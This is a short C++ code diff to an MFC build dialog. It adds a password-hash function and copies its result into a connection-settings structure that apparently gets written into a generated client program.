@@ -23,6 +23,8 @@ IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
 
 std::string GetMasterId();
 
+std::string GetPwdHash();
+
 int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);
 
 LPBYTE ReadResource(int resourceId, DWORD &dwSize) {
@@ -154,6 +156,7 @@ void CBuildDlg::OnBnClickedOk()
 	g_ConnectAddress.runningType = m_ComboRunType.GetCurSel();
 	g_ConnectAddress.protoType = m_ComboProto.GetCurSel();
 	g_ConnectAddress.iHeaderEnc = m_ComboEncrypt.GetCurSel();
+	memcpy(g_ConnectAddress.pwdHash, GetPwdHash().c_str(), sizeof(g_ConnectAddress.pwdHash));
 
 	if (!g_ConnectAddress.IsValid()) {
 		SAFE_DELETE_ARRAY(szBuffer);
